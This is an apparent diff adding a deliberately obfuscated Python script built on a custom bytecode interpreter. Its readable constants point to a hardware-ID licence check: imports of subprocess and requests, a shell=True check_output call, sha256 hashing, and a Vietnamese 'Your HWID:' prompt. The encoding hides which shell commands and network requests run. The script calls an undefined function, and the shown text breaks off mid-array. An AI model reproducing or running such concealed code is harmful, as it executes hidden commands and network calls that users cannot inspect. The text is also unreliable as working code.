+pisNRrHA_4EUvd7uu=[15282,39919,39573,48251,38163]
+HqYhMDTs_aDQwZugn=1352515617+3327550813
+if (43067^43067)==0:jTPcKqac_bjF3ljtF=49760^4609
+for UEOoFbTT_nryyoO3B in []:pass
+eLxjsWcY_qwxynJrs=1472851414*1076484950
+ZufPYmgV_eogDIpyJ=[21221,39874,54539,53741,23697]
+for wDZkbIiX_1OXSVy7c in []:pass
+def ttHiSFrC_6idMNwh0():
+ lOKCNNyc_XN9MdYoE=32960^59357
+ return 32960
+eKpjZNWw_peRL8zGS={18:34982,237:34996}
+for vyKrfpeY_IqjRk9N9 in []:pass
+def zOofcxII_lDlyPgld(v):
+ acc=0x5A5A5A5A
+ def f(bc):
+  nonlocal acc
+  for i,b in enumerate(bc):acc^=(b<<(i%24));acc=(acc*0x01000193)&0xFFFFFFFF
+ def w(v):
+  f(bytes(v['JOBBqkVE_F1wTWDhK']))
+  for c in v['NbmLvVPl_QHrSn5Af']:
+   if isinstance(c,dict) and c.get('FiVJWYRM_pd7ECLXv'):w(c)
+ w(v);return acc&0xFFFFFFFF
+hKCfvdOb_ltuSDKvz=3420509976
+YUSOiiKb_yc21CGnO={85: 'qDRNbMWi_ODvCRR3N', 190: 'LcugDbFL_UtDcQZdJ', 130: 'NKAxxKod_pEkAUvGz', 35: 'ZUKbjlrT_hb7W93oY', 80: 'vyuzSlKa_OpI6WyhD', 14: 'ltyRzruh_4AHComMz', 48: 'zfYYswVf_G8jAFY6i', 148: 'gSZBETnn_jffOdeK7', 111: 'lCajRPoS_22aewWlg', 135: 'sSCDxPsZ_QeRdXaZe', 177: 'ghelBbVc_TUuim6tm', 43: 'PCTfplCa_uSiYljVI', 24: 'bvXxolvY_MxNIwtBP', 60: 'UyMuuVYg_iUGPIa77', 56: 'uJInvbtz_hMHWfeRN', 226: 'gKEOjDfR_vK3siMac', 216: 'EYgoXVOy_JXTLgULd', 58: 'TVMYkrgJ_Mqk4oLBU', 240: 'IftexOlz_Llm3lI6Y', 137: 'UuqZdILX_LYoukSex', 199: 'ubHPslrO_LprrSOaF', 162: 'MPhjWAMG_IH5w17tg', 11: 'keUIFoKA_0hDZOKX2', 230: 'rXZbWbvN_i5jlsgFe', 18: 'RGUAWqNw_fSUyHfwX', 241: 'ICmKnEsI_quMcqtHX', 71: 'jFHLmQcF_mJmkLStY', 113: 'ofIPAeNV_hyhO1Jck', 171: 'mSuBvXkj_YoclgTjU', 116: 'iiQsNQwi_Q6jsQdsk', 59: 'csYmepAj_EDOGGEMK', 156: 'PmBoMIDM_6J9WbOpj', 245: 'EXKRDbcH_XnNpNqLe', 234: 'ZBTcjjtV_0MbeQu88', 54: 'qhbZjvLG_w1zLFxXX', 218: 'VrWqdrbu_uyNtkLEw', 239: 'DnDHOzPs_cX0OZWqC', 78: 'BNBEALQA_L1ZrXWlX', 136: 'nKnBOVRD_kURWBPRn', 184: 'OyFhvIYn_xC4jNVqe', 143: 'TPOEulvn_Kn3xNDoL', 232: 'AfxoZLhj_gLqalBZj', 21: 'VzQoDRvU_6CMJYgFw', 45: 'CTrqWZCB_IB3vbs67', 247: 'ymjURlVy_Rur3nT5o', 149: 'TEUwVRis_A5kjh1E5', 165: 'vSPvzXti_pYwBcbVy', 68: 'NWkTyrbf_atoirb7b', 1: 'VJJguoia_0ZmutxCz', 253: 'kSIorghH_voxWSEsZ', 50: 'TGgrFmNX_vGQyith8', 115: 'KSUmNErL_FhboU5n9', 157: 'noaHNWbK_rR3ckiLs', 131: 'xTCXoHaR_3VMt3eeW', 203: 'ROXIQNmc_optYv415', 89: 'prqnkWla_9qhlj9aV', 92: 'nbMLzKCx_cqwklfri', 160: 'zyJLUDOW_4fWzVYjh', 246: 'CEcDGSZI_V1MiAqAq', 238: 'xXSZmwDU_CNCiwZ48', 208: 'oBhmWmqU_OnagcfIH', 233: 'TvPQKuHG_Xj3aUxJr', 204: 'LvxAbQjO_Hi4QlSsV', 95: 'ItDaIJeS_WL05qONt', 51: 'NlLhvRtC_5PGNcozb', 202: 'AqZpgnRR_G7ek0J41', 29: 'VaxZsTic_hmf16anv', 10: 'KSgVyyZN_71xn3a7h', 125: 'pAezFVUt_6kvAfrvD'}
+gyNKSUwZ_ywvrM6Lg=38585^7651
+aPilEqkQ_zpwe8Aa6={60: 'BJbVQDJF_QzDmVxqp', 158: 'NJWWwfju_Qi6yGC9C', 106: 'thxiTsHA_mka6O4uG', 25: 'ZjffykVw_eN7MnF0w', 178: 'QyhrucwN_500QjZwM', 88: 'PUTcHLCa_blOTuFYk', 248: 'pxwznUIu_XCylUWeD', 97: 'qoHKMEeE_1ptxM1bc', 137: 'cRRfoFeW_DxGcB5Bt', 42: 'AGJRzbdv_JOexPb24', 203: 'LDVALfAD_fK4ULePE', 151: 'YgxFbWwo_012L2lCB', 192: 'hYMZnCVO_2ggTZHKH', 206: 'LvgxXOzv_foQnsifx', 167: 'OoYnWsXS_1J3kYheh', 161: 'rVMxmKaj_KzFGcRmO'}
+OulYbNrN_kSqoJhi2=42613^39615
+SEXDFJtH_U9aJOqEL=vsrrGyqB_nMGL3zxN(YUSOiiKb_yc21CGnO)
+if zOofcxII_lDlyPgld({'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [238, 0, 125, 41, 35, 0, 238, 1, 10, 13, 202, 49, 35, 1, 238, 2, 125, 111, 35, 2, 29, 0, 10, 169, 238, 3, 35, 3, 238, 4, 29, 179, 29, 1, 35, 4, 238, 5, 10, 232, 35, 5, 238, 6, 35, 6, 190, 7, 202, 129, 89, 8, 130, 7, 190, 9, 202, 244, 125, 217, 233, 0, 190, 10, 10, 164, 202, 78, 190, 11, 190, 11, 125, 24, 202, 24, 190, 12, 10, 55, 190, 13, 190, 14, 190, 15, 190, 15, 190, 16, 29, 135, 202, 82, 190, 11, 190, 11, 190, 17, 202, 75, 190, 18, 125, 22, 190, 19, 125, 104, 125, 225, 190, 16, 190, 13, 190, 19, 125, 208, 125, 173, 190, 20, 29, 91, 202, 191, 190, 21, 125, 189, 190, 22, 190, 12, 125, 182, 190, 23, 190, 24, 125, 88, 125, 71, 190, 21, 190, 13, 190, 22, 190, 25, 190, 21, 190, 26, 190, 15, 190, 27, 190, 13, 10, 135, 10, 47, 190, 21, 10, 41, 190, 28, 190, 13, 190, 15, 10, 88, 190, 10, 190, 29, 202, 105, 125, 100, 190, 30, 125, 220, 190, 25, 29, 35, 190, 22, 29, 23, 29, 60, 190, 31, 190, 13, 190, 19, 10, 49, 190, 16, 202, 246, 125, 83, 253, 45, 125, 166, 29, 90, 247, 2, 29, 111, 202, 236, 92, 1, 125, 20, 202, 127, 35, 8, 130, 6, 89, 32, 29, 56, 130, 8, 92, 1, 202, 0, 125, 82, 89, 3, 92, 0, 29, 216, 202, 134, 35, 9, 29, 251, 253, 0, 35, 10, 10, 163, 130, 9, 89, 33, 92, 0, 160, 0, 246, 105, 35, 11, 125, 73, 10, 234, 130, 10, 89, 34, 130, 11, 89, 32, 190, 7, 202, 149, 89, 8, 130, 7, 10, 123, 190, 35, 233, 0, 190, 36, 190, 37, 190, 38, 190, 39, 190, 40, 253, 5, 202, 47, 247, 2, 92, 1, 253, 0, 92, 2, 10, 122, 92, 1, 111, 0, 184, 81, 190, 41, 29, 92, 29, 0, 233, 0, 35, 12, 125, 218, 190, 42, 233, 0, 35, 13, 29, 24, 10, 4, 190, 43, 29, 217, 233, 0, 202, 197, 35, 14, 190, 44, 233, 0, 35, 15, 190, 45, 233, 0, 125, 195, 35, 16, 190, 46, 29, 104, 10, 35, 233, 0, 10, 23, 29, 179, 35, 17, 190, 47, 233, 0, 35, 18, 190, 48, 233, 0, 125, 57, 35, 19, 190, 49, 233, 0, 35, 20, 130, 21, 190, 7, 125, 36, 10, 93, 89, 8, 29, 239, 130, 7, 190, 50, 233, 0, 190, 51, 125, 134, 10, 53, 190, 51, 190, 30, 125, 149, 190, 21, 190, 52, 190, 31, 190, 51, 190, 51, 253, 8, 10, 182, 247, 2, 92, 1, 59, 0, 29, 51, 29, 4, 232, 154, 130, 20, 202, 69, 247, 0, 29, 177, 202, 46, 111, 0, 165, 0], 'NbmLvVPl_QHrSn5Af': ['os', 'time', 'random', 'json', 'hashlib', 'subprocess', 'requests', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 29, 165, 190, 0, 199, 0, 247, 1, 29, 196, 149, 0], 'NbmLvVPl_QHrSn5Af': [89], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 49, 45, 41, 42, 99, 118, 55, 116, 58, 54, 53, 60, 119, 56, 62, 61, 47, 44, 43, 46, 48, 51, 'get', 'values', 'extend', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 125, 245, 80, 0, 10, 179, 125, 35, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [55], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 95, 64, 94, 83, 68, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 10, 24, 125, 137, 89, 0, 190, 1, 89, 2, 130, 1, 190, 3, 29, 84, 233, 0, 190, 4, 190, 5, 10, 212, 190, 6, 125, 208, 190, 7, 190, 8, 190, 9, 10, 101, 125, 204, 190, 7, 10, 80, 202, 114, 190, 10, 190, 8, 125, 173, 190, 9, 10, 97, 190, 11, 190, 12, 125, 95, 190, 5, 202, 255, 202, 55, 190, 8, 10, 126, 190, 13, 190, 14, 190, 15, 29, 48, 190, 16, 190, 9, 29, 30, 202, 93, 253, 19, 247, 2, 92, 1, 190, 17, 190, 18, 115, 1, 202, 78, 125, 224, 1, 1, 10, 73, 89, 19, 29, 182, 92, 0, 125, 247, 89, 20, 92, 0, 10, 116, 35, 2, 29, 246, 202, 226, 130, 0, 202, 90, 89, 0, 190, 1, 202, 86, 202, 67, 89, 2, 10, 11, 10, 41, 130, 1, 190, 21, 10, 124, 202, 31, 233, 0, 190, 22, 29, 174, 190, 23, 10, 120, 190, 24, 190, 25, 190, 26, 10, 213, 29, 210, 190, 27, 190, 25, 190, 28, 190, 26, 190, 27, 190, 16, 190, 25, 202, 208, 29, 252, 190, 26, 125, 175, 190, 27, 202, 147, 125, 56, 190, 29, 125, 135, 10, 176, 190, 30, 190, 31, 125, 174, 190, 24, 10, 157, 125, 218, 190, 16, 190, 32, 190, 27, 190, 29, 202, 38, 190, 23, 190, 33, 253, 24, 247, 2, 92, 1, 190, 17, 29, 121, 190, 18, 115, 1, 1, 1, 10, 59, 89, 19, 92, 0, 89, 20, 92, 0, 125, 210, 35, 3, 10, 199, 190, 1, 89, 2, 29, 35, 130, 4, 202, 170, 29, 153, 130, 2, 247, 1, 190, 34, 130, 4, 10, 221, 130, 3, 29, 198, 247, 1, 125, 207, 253, 3, 125, 29, 125, 44, 92, 1, 35, 5, 130, 6, 10, 58, 89, 35, 130, 5, 89, 36, 10, 60, 92, 0, 92, 1, 89, 37, 92, 0, 35, 7, 29, 228, 130, 7, 125, 122, 149, 0], 'NbmLvVPl_QHrSn5Af': ['check_output', '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 125, 176, 125, 82, 190, 0, 125, 212, 125, 87, 199, 0, 29, 37, 247, 1, 10, 184, 125, 246, 149, 0], 'NbmLvVPl_QHrSn5Af': [124], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 27, 25, 8, 12, 14, 19, 92, 82, 15, 21, 29, 16, 18, 'shell', True, 'decode', 'strip', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 202, 107, 202, 4, 80, 0, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [60], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 91, 89, 72, 76, 78, 83, 28, 88, 73, 95, 81, 80, '_', 'sha256', 'encode', 'hexdigest'], 'FcvQsFUf_U4XrAs9K': ['subprocess', 'map', 'gMsCUQhr_WbZO4DqK', 'GPcucNQO_hOTPVSNF', 'str', 'txPEVxAN_XJZiReFx', 'hashlib', 'yLDzPgSQ_YOjf8i3w'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [190, 0, 29, 255, 35, 0, 130, 0, 190, 1, 10, 180, 29, 248, 156, 0, 232, 80, 130, 0, 125, 138, 190, 0, 59, 0, 10, 135, 232, 27, 130, 1, 247, 0, 202, 209, 35, 2, 202, 5, 130, 3, 202, 66, 190, 2, 89, 3, 29, 5, 125, 112, 190, 4, 202, 49, 130, 4, 130, 2, 202, 120, 247, 1, 253, 2, 202, 97, 125, 174, 92, 1, 247, 1, 202, 187, 202, 151, 111, 0, 29, 164, 202, 103, 190, 5, 35, 0, 184, 79, 130, 0, 190, 5, 59, 0, 29, 155, 232, 79, 130, 2, 125, 225, 130, 5, 10, 146, 125, 242, 234, 0, 232, 77, 130, 3, 190, 2, 29, 202, 89, 3, 10, 139, 130, 6, 190, 6, 202, 66, 202, 233, 233, 0, 190, 7, 10, 219, 29, 65, 190, 8, 190, 9, 190, 10, 190, 11, 125, 150, 190, 12, 190, 13, 190, 14, 190, 12, 190, 15, 190, 8, 190, 16, 190, 17, 202, 80, 29, 174, 190, 12, 10, 32, 10, 155, 190, 18, 29, 255, 190, 16, 190, 19, 190, 15, 190, 12, 125, 52, 125, 148, 190, 15, 202, 61, 190, 20, 190, 21, 10, 177, 190, 12, 125, 228, 190, 21, 29, 211, 29, 57, 190, 8, 190, 22, 190, 21, 202, 251, 190, 23, 253, 28, 247, 2, 92, 1, 29, 250, 125, 116, 247, 1, 29, 74, 10, 252, 111, 0, 130, 7, 247, 0, 111, 0, 190, 1, 35, 0, 184, 2, 165, 0], 'NbmLvVPl_QHrSn5Af': [224, 96, '', 'join', 'HWID của bạn: ', 133, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 89, 202, 5, 130, 0, 80, 0, 10, 97, 190, 0, 199, 0, 125, 90, 10, 237, 247, 1, 10, 191, 202, 180, 149, 0], 'NbmLvVPl_QHrSn5Af': [107], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 63, 3, 2, 7892, 31, 75, 9, 7840, 8, 475, 10, 378, 7816, 7886, 27, 130, 69], 'FcvQsFUf_U4XrAs9K': ['jeaeYzVX_LBvsPCp7', 'cqeyTKeO_EIO5scZ0', 'yLDzPgSQ_YOjf8i3w', 'print', 'str', 'SEDsaGYM_jXRfBvRw', 'map', 'exit'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [202, 253, 190, 0, 35, 0, 125, 81, 10, 165, 130, 0, 190, 1, 156, 0, 232, 53, 130, 0, 190, 0, 59, 0, 232, 223, 202, 45, 130, 1, 190, 2, 89, 3, 130, 2, 125, 71, 202, 95, 190, 4, 202, 200, 233, 0, 10, 248, 190, 5, 29, 80, 202, 54, 190, 6, 190, 7, 190, 8, 190, 9, 10, 208, 190, 5, 10, 71, 190, 10, 202, 78, 125, 189, 190, 11, 125, 61, 190, 12, 190, 8, 190, 13, 29, 248, 190, 9, 190, 6, 190, 11, 29, 245, 190, 14, 190, 8, 190, 9, 202, 32, 190, 13, 190, 15, 190, 11, 190, 9, 190, 16, 190, 17, 10, 9, 190, 18, 190, 9, 29, 196, 202, 76, 190, 19, 29, 242, 190, 15, 125, 145, 10, 75, 190, 8, 29, 46, 29, 165, 190, 20, 190, 21, 125, 192, 253, 30, 247, 2, 10, 54, 92, 1, 247, 1, 29, 63, 111, 0, 125, 118, 130, 1, 125, 97, 190, 2, 89, 3, 130, 2, 190, 22, 125, 137, 233, 0, 29, 145, 29, 82, 190, 23, 202, 23, 202, 149, 190, 6, 190, 24, 190, 25, 190, 26, 125, 0, 190, 27, 190, 28, 202, 130, 202, 64, 190, 29, 190, 24, 190, 30, 125, 76, 10, 222, 253, 10, 247, 2, 92, 1, 247, 1, 111, 0, 130, 1, 190, 2, 29, 135, 125, 211, 89, 3, 130, 2, 190, 31, 233, 0, 190, 32, 125, 252, 190, 33, 202, 34, 190, 34, 190, 35, 190, 36, 190, 37, 190, 38, 190, 34, 202, 46, 190, 18, 253, 9, 247, 2, 92, 1, 247, 1, 125, 99, 10, 93, 111, 0, 10, 188, 202, 194, 130, 1, 29, 48, 10, 35, 190, 2, 125, 14, 10, 14, 89, 3, 125, 93, 202, 42, 130, 2, 190, 39, 233, 0, 202, 125, 10, 255, 190, 40, 190, 41, 29, 158, 190, 42, 202, 37, 202, 170, 190, 43, 29, 106, 190, 44, 190, 45, 190, 46, 190, 32, 125, 185, 202, 235, 190, 47, 190, 42, 190, 48, 202, 67, 190, 13, 202, 134, 253, 12, 202, 81, 202, 148, 247, 2, 92, 1, 247, 1, 125, 31, 111, 0, 125, 67, 10, 152, 130, 3, 10, 12, 202, 237, 190, 2, 89, 3, 130, 2, 29, 73, 190, 49, 125, 188, 233, 0, 10, 73, 202, 237, 190, 50, 29, 197, 125, 78, 190, 51, 190, 52, 29, 2, 10, 41, 190, 53, 190, 33, 190, 54, 190, 55, 10, 125, 202, 139, 190, 36, 190, 33, 29, 19, 29, 75, 190, 56, 190, 51, 125, 167, 190, 57, 10, 30, 125, 41, 190, 58, 190, 33, 190, 47, 190, 33, 125, 130, 125, 139, 253, 16, 202, 103, 247, 2, 92, 1, 247, 1, 89, 59, 92, 0, 125, 153, 202, 190, 35, 4, 190, 2, 29, 97, 89, 3, 29, 215, 202, 182, 130, 2, 190, 60, 233, 0, 125, 126, 125, 94, 190, 33, 29, 148, 29, 101, 253, 1, 247, 2, 92, 1, 125, 17, 125, 174, 190, 2, 89, 3, 130, 2, 202, 175, 190, 61, 202, 240, 29, 170, 233, 0, 190, 62, 29, 185, 202, 88, 190, 16, 202, 107, 29, 43, 190, 63, 10, 130, 190, 64, 190, 65, 125, 116, 253, 5, 247, 2, 202, 236, 125, 105, 92, 1, 29, 35, 190, 2, 10, 138, 89, 3, 10, 77, 29, 54, 130, 2, 125, 67, 190, 66, 125, 88, 233, 0, 190, 58, 125, 81, 253, 1, 247, 2, 92, 1, 190, 2, 202, 126, 89, 3, 130, 2, 202, 190, 202, 15, 190, 67, 125, 133, 233, 0, 190, 68, 190, 69, 10, 193, 202, 153, 190, 13, 190, 70, 190, 6, 125, 254, 253, 5, 247, 2, 92, 1, 10, 210, 190, 2, 125, 62, 202, 185, 89, 3, 130, 2, 10, 176, 190, 71, 233, 0, 202, 187, 29, 34, 190, 28, 202, 187, 202, 124, 253, 1, 247, 2, 125, 197, 29, 246, 92, 1, 29, 71, 29, 13, 190, 2, 29, 239, 89, 3, 125, 141, 202, 210, 130, 2, 190, 72, 233, 0, 202, 40, 125, 156, 190, 73, 125, 118, 190, 74, 190, 20, 190, 75, 190, 76, 190, 27, 190, 50, 190, 77, 253, 8, 247, 2, 92, 1, 10, 83, 115, 3, 202, 217, 35, 5, 130, 5, 89, 78, 202, 21, 130, 4, 92, 1, 202, 114, 35, 6, 190, 47, 35, 0, 10, 136, 29, 79, 184, 52, 130, 0, 190, 47, 59, 0, 10, 177, 202, 77, 232, 46, 202, 74, 202, 189, 130, 6, 190, 79, 10, 142, 10, 213, 54, 0, 232, 43, 130, 1, 190, 2, 89, 3, 130, 2, 190, 80, 233, 0, 190, 25, 190, 81, 29, 60, 190, 82, 10, 115, 29, 155, 190, 8, 190, 83, 125, 91, 10, 134, 190, 48, 190, 84, 190, 9, 10, 53, 29, 159, 190, 8, 125, 18, 190, 85, 190, 48, 190, 86, 190, 9, 202, 46, 190, 87, 202, 34, 190, 8, 190, 48, 190, 88, 190, 89, 29, 121, 190, 8, 29, 196, 202, 243, 190, 90, 29, 223, 190, 91, 190, 19, 202, 27, 190, 8, 10, 173, 190, 26, 202, 207, 190, 92, 190, 83, 202, 112, 190, 8, 10, 189, 202, 240, 190, 93, 190, 94, 190, 9, 190, 48, 190, 8, 190, 83, 190, 48, 190, 84, 29, 104, 125, 219, 190, 9, 190, 13, 202, 64, 190, 8, 125, 192, 10, 197, 190, 21, 190, 74, 29, 59, 10, 48, 190, 90, 190, 20, 190, 82, 253, 43, 247, 2, 92, 1, 202, 57, 247, 1, 111, 0, 29, 121, 125, 191, 190, 2, 89, 3, 10, 137, 130, 2, 29, 208, 190, 95, 233, 0, 190, 96, 190, 87, 29, 191, 29, 44, 190, 9, 190, 97, 202, 218, 190, 83, 253, 5, 10, 237, 247, 2, 92, 1, 35, 6, 190, 98, 29, 160, 35, 0, 184, 52, 10, 119, 130, 0, 190, 98, 59, 0, 232, 52, 130, 6, 10, 193, 125, 239, 149, 0, 184, 2, 29, 171, 165, 0], 'NbmLvVPl_QHrSn5Af': [178, 187, '', 'join', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [96], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 35, 8, 7853, 14, 64, 12, 9, 5, 20, 7847, 7873, 3, 7815, 1, 2, 90, 106, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 171, 130, 0, 202, 205, 80, 0, 29, 155, 190, 0, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [38], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 23, 6, 98, 67, 74, 82, 71, 126, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 101, 29, 91, 130, 0, 29, 227, 125, 140, 80, 0, 190, 0, 199, 0, 125, 33, 10, 93, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [89], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 107, 119, 121, 26, 54, 61, 60, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 199, 0, 202, 51, 125, 50, 247, 1, 202, 208, 149, 0], 'NbmLvVPl_QHrSn5Af': [30], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 45, 48, 62, 95, 108, 125, 123, 109, 70, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 10, 59, 80, 0, 190, 0, 199, 0, 247, 1, 125, 252, 125, 34, 149, 0], 'NbmLvVPl_QHrSn5Af': [87], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 25, 63, 7930, 39, 59, 7846, 52, 7834, 57, 'strip', {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 125, 86, 190, 0, 199, 0, 247, 1, 29, 216, 29, 84, 149, 0], 'NbmLvVPl_QHrSn5Af': [70], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 5, 130, 0, 80, 0, 190, 0, 199, 0, 247, 1, 29, 196, 149, 0], 'NbmLvVPl_QHrSn5Af': [102], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 34, 10, 18, 7, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 29, 251, 125, 132, 190, 0, 29, 109, 125, 177, 199, 0, 10, 144, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [11], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [29, 208, 130, 0, 202, 117, 80, 0, 125, 3, 190, 0, 199, 0, 29, 99, 10, 225, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [112], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 51, 31, 21, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 25, 130, 0, 80, 0, 190, 0, 202, 232, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [97], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 198, 125, 130, 130, 0, 80, 0, 190, 0, 202, 213, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [57], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 120, 75, 92, 76, 97, 'get', None, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 10, 157, 80, 0, 190, 0, 10, 34, 10, 143, 199, 0, 247, 1, 149, 0], 'NbmLvVPl_QHrSn5Af': [46], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 7903, 79, 77, 7907, 69, 218, 73, 7885, 94, 66, 7913, 7833, 319, 7909, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [130, 0, 80, 0, 190, 0, 199, 0, 247, 1, 29, 104, 202, 86, 149, 0], 'NbmLvVPl_QHrSn5Af': [44], 'FcvQsFUf_U4XrAs9K': ['chr'], 'fhuctOnk_99WtMbd3': ['_x'], 'vFxTVMiL_6e4QqeX7': []}, 104, 88, 151], 'FcvQsFUf_U4XrAs9K': ['OGVpKsnN_vNcZiCOQ', 'print', 'map', 'input', 'SPOanHfV_TEqSjaRw', 'YLiXWxSS_rENEJzD2', 'xxSIwbGF_Ccx40LJx'], 'fhuctOnk_99WtMbd3': [], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [10, 210, 10, 26, 190, 0, 35, 0, 130, 0, 190, 1, 10, 63, 156, 0, 232, 58, 130, 0, 190, 0, 59, 0, 232, 19, 202, 74, 29, 95, 130, 1, 29, 78, 130, 2, 89, 2, 92, 0, 247, 1, 35, 3, 190, 3, 29, 106, 35, 0, 184, 57, 130, 0, 125, 66, 190, 3, 59, 0, 10, 128, 10, 68, 232, 49, 130, 4, 202, 58, 48, 4, 202, 223, 125, 5, 89, 5, 125, 25, 125, 230, 80, 0, 92, 1, 125, 247, 78, 0, 232, 46, 130, 4, 89, 6, 130, 4, 29, 170, 10, 222, 48, 4, 89, 7, 80, 0, 125, 35, 92, 1, 190, 8, 29, 51, 190, 9, 115, 1, 202, 130, 1, 1, 202, 193, 111, 0, 202, 99, 190, 10, 111, 0, 130, 3, 149, 0, 190, 11, 35, 0, 184, 57, 130, 0, 190, 11, 59, 0, 232, 57, 190, 10, 29, 231, 111, 0, 29, 71, 10, 156, 190, 1, 125, 143, 10, 104, 35, 0, 184, 2, 165, 0], 'NbmLvVPl_QHrSn5Af': [126, 105, 'time', 25, 'path', 'exists', 'makedirs', 'dirname', 'exist_ok', True, None, 191], 'FcvQsFUf_U4XrAs9K': ['iRcrWDKt_hH7tmPXr', 'int', 'time', 'bShStDUr_RWtgMU4m', 'os'], 'fhuctOnk_99WtMbd3': ['filename'], 'vFxTVMiL_6e4QqeX7': []}, {'FiVJWYRM_pd7ECLXv': 1, 'JOBBqkVE_F1wTWDhK': [125, 81, 29, 161, 190, 0, 10, 103, 35, 0, 130, 0, 190, 1, 156, 0, 10, 43, 232, 107, 29, 45, 130, 0, 29, 25, 190, 0, 29, 243, 59, 0, 202, 25, 29, 245, 232, 57, 29, 232, 202, 48, 130, 1, 89, 2, 125, 241, 190, 3, 89, 4, 130, 2, 10, 101, 202, 59, 190, 5, 29, 3, 233, 0, 29, 154, 190, 6, 10, 81, 190, 7, 190, 8, 125, 167, 190, 9, 190, 10, 190, 11, 190, 12, 202, 211, 190, 8, 202, 231, 190, 6, 190, 13, 190, 14, 10, 188, 190, 15, 190, 13, 190, 16, 190, 17, 125, 241, 190, 11, 125, 124, 190, 8, 190, 0, 29, 83, 190, 8, 190, 16, 10, 205, 190, 18, 190, 17, 190, 6, 125, 194, 190, 8, 125, 192, 202, 123, 190, 18, 190, 19, 190, 20, 10, 139, 10, 232, 